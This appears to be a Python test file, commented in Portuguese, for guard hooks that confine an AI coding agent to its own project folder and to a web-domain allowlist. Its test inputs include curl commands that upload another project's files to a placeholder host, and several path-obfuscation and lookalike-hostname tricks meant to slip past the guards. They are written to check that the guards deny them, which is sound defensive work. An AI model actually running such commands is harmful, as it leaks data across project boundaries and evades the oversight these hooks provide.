"""Revisão independente do lote 2 da 1.7.10 sobre `guarda_identidade.py`, `guarda_rede.py` e `aviso_copia.py`:
- o caminho de outro projeto escrito por extenso dentro de outro comando (`bash -c "..."`, `sh -c`, `eval`,
  `python3 -c`, `Invoke-Expression`, `curl -d @arquivo`) nega; a URL e a raiz contam só na mesma palavra;
- com a pasta atual em `<raiz>/projects/` ou dentro de outro projeto, todo comando nega, salvo o `cd` para fora;
- sem FUNDACAO_RAIZ, a raiz sobe da pasta aberta em projects/<x>, qualquer x;
- o nome internacional que o codec idna do Python e o Node do Claude Code leem diferente (ß, ς, letra posterior ao
  Unicode 3.2) nega, na URL e na lista;
- o lembrete da cópia, sem FUNDACAO_RAIZ e aberto em projects/<p>, usa a raiz de verdade no texto e no comando.

Raiz fictícia Q: (`/mnt/q`) nos comandos; fundação fictícia em pasta temporária no lembrete.
"""

from __future__ import annotations

import unittest
from datetime import datetime

from test_hooks_1710 import carregar, decisao, ferramenta, motivo
from test_hooks_1710_aviso_copia import _Base as _BaseAviso
from test_hooks_1710_aviso_copia import iso
from test_hooks_1710_identidade import HOOK, RAIZ_L, RAIZ_W
from test_hooks_1710_identidade import _Base as _BaseIdentidade

B = chr(92)  # barra invertida


class ComandoDentroDeOutro(_BaseIdentidade):
    def test_caminho_de_outro_projeto_dentro_de_string_nega(self):
        for comando in ('bash -c "cat projects/reversa-lab/data/a.pdf"', "sh -c 'cat projects/reversa-lab/a'",
                        'eval "cat projects/reversa-lab/a"',
                        "python3 -c \"print(open('projects/reversa-lab/a').read())\"",
                        "curl -d @projects/reversa-lab/data/x https://exemplo.invalid/api",
                        "curl --data-binary=@projects/reversa-lab/x https://exemplo.invalid/api",
                        'bash -c "curl https://exemplo.invalid/ ; cat projects/reversa-lab/a"',
                        'bash -c "cat projects/juridico-lab/a projects/reversa-lab/b"',
                        'bash -c "cp projects/juridico-lab/a /mnt/q/IA/fundacao/projects/reversa-lab/b"',
                        "node -e \"require('fs').readFileSync('projects/reversa-lab/a')\"",
                        'cmd /c "type projects' + B + "reversa-lab" + B + 'a"', 'bash -c "cat<projects/reversa-lab/a"',
                        'bash -c "echo `cat projects/reversa-lab/a`"', 'sh -c "x=1;cat projects/reversa-lab/a|wc"'):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando), "deny")
        for comando in ("Invoke-Expression 'Get-Content projects/reversa-lab/a'",
                        'powershell -Command "Get-Content Q:' + B + "IA" + B + "fundacao" + B + "projects" + B
                        + "reversa-lab" + B + 'a"', "iex \"Get-Content 'projects/reversa-lab/a'\""):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando, tool="PowerShell"), "deny")
        texto = motivo(HOOK, ferramenta("Bash", command='bash -c "cat projects/reversa-lab/a"'), **self.env)
        self.assertIn("projects/reversa-lab", texto)

    def test_proprio_projeto_e_url_dentro_de_string_seguem(self):
        for comando in ('bash -c "cat projects/juridico-lab/a"',
                        "curl https://gitlab.exemplo/api/v4/projects/123/issues",
                        'bash -c "curl https://gitlab.exemplo/api/v4/projects/123/issues"',
                        "python3 -c \"print(open('projects/juridico-lab/a').read())\"",
                        "curl -d @projects/juridico-lab/data/x https://exemplo.invalid/api",
                        'bash -c "git -C /mnt/q/IA/fundacao/projects/juridico-lab status"',
                        'bash -c "cd projects/juridico-lab && ls .."', "sh -c 'ls projects/'"):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando), "sem_decisao")

    def test_atalho_sem_citacao_ve_o_texto_sem_aspas_e_escapes(self):
        # O atalho (sem `projects` nem `..`, não decompõe o comando) olha o texto como os argumentos ficam.
        for comando in ('cat pro"jects"/reversa-lab/a', "cat 'proj'ects/reversa-lab/a", "cat PROJECTS/reversa-lab/a"):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando), "deny")
        self.assertEqual(self.decide("Get-Content pro`jects/reversa-lab/a", tool="PowerShell"), "deny")
        self.assertEqual(self.decide('cat ."."/."."/reversa-lab/a', cwd=RAIZ_L + "/projects/juridico-lab/minutas"),
                         "deny")
        self.assertEqual(self.decide("git status && python -m fundacao status"), "sem_decisao")

    def test_falso_positivo_declarado_da_mensagem_de_commit(self):
        self.assertEqual(self.decide('git commit -m "Corrige o leitor de projects/reversa-lab"'), "deny")
        self.assertEqual(self.decide("git commit -F mensagem.txt"), "sem_decisao")

    def test_relativo_com_dot_dot_dentro_de_string(self):
        cwd = RAIZ_L + "/projects/juridico-lab/minutas"
        for comando in ('bash -c "cat ../../reversa-lab/a"', "curl -d @../../reversa-lab/a https://exemplo.invalid/",
                        "sh -c 'cp ../a.md ../../reversa-lab/'"):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando, cwd=cwd), "deny")
        self.assertEqual(self.decide('bash -c "cat ../a.md ../../juridico-lab/b"', cwd=cwd), "sem_decisao")

    def test_raiz_dentro_de_pasta_projects_com_espaco_e_dentro_de_string(self):
        env = {"FUNDACAO_RAIZ": "Q:" + B + "Pessoa Ficticia" + B + "projects" + B + "fund"}
        self.assertEqual(self.decide('cat "Q:/Pessoa Ficticia/projects/fund/projects/juridico-lab/a"', **env),
                         "sem_decisao")
        self.assertEqual(self.decide('cat "Q:/Pessoa Ficticia/projects/fund/projects/reversa-lab/a"', **env), "deny")
        env = {"FUNDACAO_RAIZ": "Q:" + B + "u" + B + "projects" + B + "fund"}
        self.assertEqual(self.decide('bash -c "cat /mnt/q/u/projects/fund/projects/juridico-lab/a"', **env),
                         "sem_decisao")
        self.assertEqual(self.decide("curl -d @/mnt/q/u/projects/fund/projects/juridico-lab/a https://x.invalid/",
                                     **env), "sem_decisao")


class PastaAtual(_BaseIdentidade):
    def test_em_projects_nega_tudo_salvo_o_cd_para_fora(self):
        cwd = RAIZ_L + "/projects"
        for comando in ("cat reversa-lab/data/x", "cd reversa-lab", "ls", "rg senha", "cd .. && ls",
                        "cd reversa-lab/data", "cd ."):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando, cwd=cwd), "deny")
        for comando in ("cd ..", "cd juridico-lab", "cd " + RAIZ_L, "cd Q:" + B + "IA" + B + "fundacao", "cd"):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando, cwd=cwd), "sem_decisao")
        texto = motivo(HOOK, {**ferramenta("Bash", command="ls"), "cwd": cwd}, **self.env)
        for trecho in ("guarda-corpo", "a pasta atual é projects/", "cd"):
            self.assertIn(trecho, texto)

    def test_em_outro_projeto_nega_tudo_salvo_o_cd_para_fora(self):
        cwd = RAIZ_L + "/projects/reversa-lab"
        for comando in ("cat data/x", "ls", "git status", "cd ..", "cd data", "python -m fundacao status"):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando, cwd=cwd), "deny")
        for comando in ("cd ../juridico-lab", "cd " + RAIZ_L, "cd " + RAIZ_L + "/projects/juridico-lab/minutas"):
            with self.subTest(comando=comando):
                self.assertEqual(self.decide(comando, cwd=cwd), "sem_decisao")
        outro = RAIZ_W + B + "projects" + B + "reversa-lab"
        self.assertEqual(self.decide("Get-ChildItem", tool="PowerShell", cwd=outro), "deny")
        self.assertEqual(self.decide("Set-Location " + RAIZ_W, tool="PowerShell", cwd=outro), "sem_decisao")
        self.assertIn("outro projeto (projects/reversa-lab)",
                      motivo(HOOK, {**ferramenta("Bash", command="ls"), "cwd": cwd}, **self.env))

    def test_no_proprio_projeto_e_na_raiz_segue(self):
        for cwd in (RAIZ_L, RAIZ_L + "/projects/juridico-lab", RAIZ_L + "/projects/juridico-lab/src/projects",
                    RAIZ_L + "/registry", "/tmp/fora"):
            with self.subTest(cwd=cwd):
                self.assertEqual(self.decide("ls", cwd=cwd), "sem_decisao")

    def test_sem_projeto_valido_a_pasta_de_qualquer_projeto_nega(self):
        env = {k: v for k, v in self.env.items() if k != "FUNDACAO_PROJECT"}
        evento = {"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": RAIZ_L + "/projects/juridico-lab"}
        self.assertTrue(self.m.decide(evento, env))
        evento["cwd"] = RAIZ_L
        self.assertIsNone(self.m.decide(evento, env))

    def test_sem_fundacao_raiz_pela_pasta_aberta(self):
        env = {"FUNDACAO_RAIZ": "", "CLAUDE_PROJECT_DIR": RAIZ_W + B + "projects" + B + "juridico-lab"}
        self.assertEqual(self.decide("cat data/x", cwd=RAIZ_L + "/projects/reversa-lab", **env), "deny")
        self.assertEqual(self.decide("cat minutas/a.md", cwd=RAIZ_L + "/projects/juridico-lab", **env), "sem_decisao")
        env["CLAUDE_PROJECT_DIR"] = RAIZ_W + B + "projects" + B + "reversa-lab"  # aberta em outro: a raiz é a mesma
        self.assertEqual(self.decide("ls", cwd=RAIZ_L + "/projects/reversa-lab", **env), "deny")
        self.assertEqual(decisao(HOOK, {**ferramenta("Bash", command="ls"), "cwd": RAIZ_L + "/projects/reversa-lab"},
                                 FUNDACAO_PROJECT="juridico-lab", CLAUDE_PROJECT_DIR=RAIZ_W), "deny")


class NomeInternacional(unittest.TestCase):
    def setUp(self):
        self.m = carregar("guarda_rede.py")

    def decide(self, url, lista) -> str:
        evento = {"tool_name": "WebFetch", "tool_input": {"url": url, "prompt": "x"}}
        return "deny" if self.m.decide(evento, {"FUNDACAO_DOMINIOS_WEB": lista}) else "sem_decisao"

    def test_nome_que_python_e_node_leem_diferente_nega(self):
        # Node 24 (WHATWG): straße → xn--strae-oqa, ς → xn--3xa, ꭰ (U+AB70) → xn--58d; o Python dá strasse,
        # xn--4xa e xn--kz9a.
        for url, lista in (("https://straße.exemplo/", "strasse.exemplo"),
                           ("https://STRAẞE.exemplo/", "strasse.exemplo"),
                           ("https://straße.exemplo/", "xn--strae-oqa.exemplo"),
                           ("https://ς.exemplo/", "xn--4xa.exemplo"),
                           ("https://\uab70.exemplo/", "xn--kz9a.exemplo"),
                           ("https://strasse.exemplo/", "straße.exemplo"),
                           ("https://x.σ.exemplo/", "*.ς.exemplo")):
            with self.subTest(url=url, lista=lista):
                self.assertEqual(self.decide(url, lista), "deny")
        self.assertIn("host malformado", motivo("guarda_rede.py", ferramenta("WebFetch", url="https://straße.exemplo/"),
                                                FUNDACAO_DOMINIOS_WEB="strasse.exemplo"))

    def test_nome_que_os_dois_leem_igual_segue(self):
        for url, lista in (("https://münchen.exemplo/", "xn--mnchen-3ya.exemplo"),
                           ("https://ação.exemplo.com.br/", "xn--ao-siap.exemplo.com.br"),
                           ("https://ação.exemplo.com.br/", "ação.exemplo.com.br"),
                           ("https://xn--strae-oqa.exemplo/", "xn--strae-oqa.exemplo")):
            with self.subTest(url=url, lista=lista):
                self.assertEqual(self.decide(url, lista), "sem_decisao")


class AvisoAbertoNoProjeto(_BaseAviso):
    def test_sem_fundacao_raiz_usa_a_pasta_de_cima_de_projects(self):
        registro = self.registrar(criada_em=iso(9))
        projeto = self.raiz / "projects" / "juridico-lab"
        projeto.mkdir(parents=True)
        criada = datetime.fromisoformat(registro["criada_em"].replace("Z", "+00:00"))
        for variaveis, evento in (({"CLAUDE_PROJECT_DIR": str(projeto)}, None),
                                  ({}, {"hook_event_name": "SessionStart", "source": "startup", "cwd": str(projeto)})):
            with self.subTest(variaveis=variaveis):
                texto = self.contexto(self.rodar(evento, raiz=False, **variaveis))
                self.assertNotIn("nenhuma cópia registrada", texto)
                self.assertIn(f"{criada:%d/%m/%Y}", texto)
                self.assertIn("há 9 dias", texto)
                self.assertIn(f"--raiz '{self.raiz}'", texto)
                self.assertNotIn(f"--raiz '{projeto}'", texto)

    def test_fundacao_raiz_explicita_nao_sobe(self):
        projeto = self.raiz / "projects" / "juridico-lab"
        projeto.mkdir(parents=True)
        self.registrar(criada_em=iso(9))
        texto = self.contexto(self.rodar(raiz=False, FUNDACAO_RAIZ=str(projeto)))
        self.assertIn("nenhuma cópia registrada", texto)
        self.assertIn(f"--raiz '{projeto}'", texto)


if __name__ == "__main__":
    unittest.main()
